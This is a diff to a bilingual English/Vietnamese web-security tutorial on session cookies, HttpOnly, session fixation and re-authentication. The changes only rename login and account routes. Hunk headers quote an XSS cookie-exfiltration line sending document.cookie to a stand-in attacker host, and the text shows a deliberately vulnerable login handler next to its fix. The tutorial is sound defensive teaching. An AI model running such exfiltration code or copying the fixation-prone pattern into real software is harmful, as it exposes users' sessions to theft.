@@ -328,7 +328,7 @@ fetch('https://ke-tan-cong.com/?c=' + document.cookie);</code></pre>
 // Co HttpOnly:
 "theme=dark"                              ← chi con cookie khong nhay cam</div>
 <div class="pitfall">
-<p><strong>Trap — <code>HttpOnly</code> stops the token being <em>read</em>; it does not stop it being <em>used</em>.</strong> An attacker's script running on your page can still call <code>fetch('/api/doi-email', {method:'POST', credentials:'include', …})</code> and the browser attaches the cookie automatically. The session is not stolen, but the attacker acts as the user for as long as the script runs. <code>HttpOnly</code> turns permanent account takeover into a session-length problem — a large improvement, and not a fix for XSS.</p>
+<p><strong>Trap — <code>HttpOnly</code> stops the token being <em>read</em>; it does not stop it being <em>used</em>.</strong> An attacker's script running on your page can still call <code>fetch('/api/change-email', {method:'POST', credentials:'include', …})</code> and the browser attaches the cookie automatically. The session is not stolen, but the attacker acts as the user for as long as the script runs. <code>HttpOnly</code> turns permanent account takeover into a session-length problem — a large improvement, and not a fix for XSS.</p>
 </div>
 
 <h3><code>Secure</code> — HTTPS only, with one useful exception</h3>
@@ -455,7 +455,7 @@ fetch('https://ke-tan-cong.com/?c=' + document.cookie);</code></pre>
 // Co HttpOnly:
 "theme=dark"                              ← chi con cookie khong nhay cam</div>
 <div class="pitfall">
-<p><strong>Bẫy — <code>HttpOnly</code> chặn việc token bị <em>ĐỌC</em>; nó KHÔNG chặn việc token bị <em>DÙNG</em>.</strong> Một script của kẻ tấn công đang chạy trên trang của bạn vẫn gọi được <code>fetch('/api/doi-email', {method:'POST', credentials:'include', …})</code> và trình duyệt TỰ ĐỘNG đính cookie vào. Cái phiên không bị cắp, nhưng kẻ tấn công HÀNH ĐỘNG với tư cách người dùng trong suốt thời gian script còn chạy. <code>HttpOnly</code> biến một cú chiếm tài khoản VĨNH VIỄN thành một bài toán dài bằng một phiên — một cải thiện lớn, và KHÔNG phải cách vá cho XSS.</p>
+<p><strong>Bẫy — <code>HttpOnly</code> chặn việc token bị <em>ĐỌC</em>; nó KHÔNG chặn việc token bị <em>DÙNG</em>.</strong> Một script của kẻ tấn công đang chạy trên trang của bạn vẫn gọi được <code>fetch('/api/change-email', {method:'POST', credentials:'include', …})</code> và trình duyệt TỰ ĐỘNG đính cookie vào. Cái phiên không bị cắp, nhưng kẻ tấn công HÀNH ĐỘNG với tư cách người dùng trong suốt thời gian script còn chạy. <code>HttpOnly</code> biến một cú chiếm tài khoản VĨNH VIỄN thành một bài toán dài bằng một phiên — một cải thiện lớn, và KHÔNG phải cách vá cho XSS.</p>
 </div>
 
 <h3><code>Secure</code> — chỉ HTTPS, kèm một ngoại lệ hữu ích</h3>
@@ -581,7 +581,7 @@ res.clearCookie('__Host-phien', {
   </div>
 </div>
 <pre><code><span class="tok-comment">// ❌ The vulnerable pattern: reuse the id, just attach a user to it</span>
-app.post('/dang-nhap', async (req, res) =&gt; {
+app.post('/sign-in', async (req, res) =&gt; {
   const nd = await kiemTraMatKhau(req.body);
   await prisma.phien.update({
     where: { id: req.phien.id },              <span class="tok-comment">// ← CÙNG mã phiên</span>
@@ -603,7 +603,7 @@ app.post('/dang-nhap', async (req, res) =&gt; {
 
 <h3>The fix</h3>
 <pre><code><span class="tok-comment">// ✅ Thu hồi cái cũ, cấp cái MỚI. Bốn dòng.</span>
-app.post('/dang-nhap', async (req, res) =&gt; {
+app.post('/sign-in', async (req, res) =&gt; {
   const nd = await kiemTraMatKhau(req.body);
 
   if (req.phien) {
@@ -634,7 +634,7 @@ app.post('/dang-nhap', async (req, res) =&gt; {
 
 <h3>Carrying anonymous state across</h3>
 <pre><code><span class="tok-comment">// Người dùng có giỏ hàng TRƯỚC khi đăng nhập. Chuyển DỮ LIỆU, không chuyển MÃ.</span>
-app.post('/dang-nhap', async (req, res) =&gt; {
+app.post('/sign-in', async (req, res) =&gt; {
   const gioCu = req.phien?.id;                    <span class="tok-comment">// giữ lại id CŨ để đọc dữ liệu</span>
   const nd = await kiemTraMatKhau(req.body);
 
@@ -670,8 +670,8 @@ export function canXacThucLai(phutToiDa: number) {
   };
 }
 
-app.post('/tai-khoan/doi-email',  requireAuth, canXacThucLai(5), doiEmail);
-app.post('/tai-khoan/xoa',        requireAuth, canXacThucLai(5), xoaTaiKhoan);
+app.post('/account/change-email',  requireAuth, canXacThucLai(5), doiEmail);
+app.post('/account/delete',        requireAuth, canXacThucLai(5), xoaTaiKhoan);
 app.post('/thanh-toan/rut-tien',  requireAuth, canXacThucLai(2), rutTien);</code></pre>
 <div class="lz-stack">
   <div class="lz-layer"><span class="lz-lname">It defends against the stolen session, not the stolen password</span><span class="lz-lnote">An attacker with a hijacked cookie can read everything, but cannot change the email or delete the account without producing the password. That is the gap between "session compromised" and "account lost", and it is worth building.</span></div>
@@ -712,7 +712,7 @@ app.post('/thanh-toan/rut-tien',  requireAuth, canXacThucLai(2), rutTien);</code
   </div>
 </div>
 <pre><code><span class="tok-comment">// ❌ Mẫu có lỗ hổng: dùng lại mã, chỉ gắn thêm người dùng vào</span>
-app.post('/dang-nhap', async (req, res) =&gt; {
+app.post('/sign-in', async (req, res) =&gt; {
   const nd = await kiemTraMatKhau(req.body);
   await prisma.phien.update({
     where: { id: req.phien.id },              <span class="tok-comment">// ← CÙNG mã phiên</span>
@@ -734,7 +734,7 @@ app.post('/dang-nhap', async (req, res) =&gt; {
 
 <h3>Cách vá</h3>
 <pre><code><span class="tok-comment">// ✅ Thu hồi cái cũ, cấp cái MỚI. Bốn dòng.</span>
-app.post('/dang-nhap', async (req, res) =&gt; {
+app.post('/sign-in', async (req, res) =&gt; {
   const nd = await kiemTraMatKhau(req.body);
 
   if (req.phien) {
@@ -765,7 +765,7 @@ app.post('/dang-nhap', async (req, res) =&gt; {
 
 <h3>Mang trạng thái ẩn danh đi theo</h3>
 <pre><code><span class="tok-comment">// Người dùng có giỏ hàng TRƯỚC khi đăng nhập. Chuyển DỮ LIỆU, không chuyển MÃ.</span>
-app.post('/dang-nhap', async (req, res) =&gt; {
+app.post('/sign-in', async (req, res) =&gt; {
   const gioCu = req.phien?.id;                    <span class="tok-comment">// giữ lại id CŨ để đọc dữ liệu</span>
   const nd = await kiemTraMatKhau(req.body);
 
@@ -801,8 +801,8 @@ export function canXacThucLai(phutToiDa: number) {
   };
 }
 
-app.post('/tai-khoan/doi-email',  requireAuth, canXacThucLai(5), doiEmail);
-app.post('/tai-khoan/xoa',        requireAuth, canXacThucLai(5), xoaTaiKhoan);
+app.post('/account/change-email',  requireAuth, canXacThucLai(5), doiEmail);
+app.post('/account/delete',        requireAuth, canXacThucLai(5), xoaTaiKhoan);
 app.post('/thanh-toan/rut-tien',  requireAuth, canXacThucLai(2), rutTien);</code></pre>
 <div class="lz-stack">
   <div class="lz-layer"><span class="lz-lname">Nó phòng cú CẮP PHIÊN, không phòng cú cắp mật khẩu</span><span class="lz-lnote">Kẻ tấn công cầm một cookie bị chiếm thì ĐỌC được mọi thứ, nhưng KHÔNG đổi được email hay xoá được tài khoản nếu không trình ra mật khẩu. Đó chính là khoảng cách giữa "phiên bị chiếm" và "mất tài khoản", và nó đáng để dựng.</span></div>
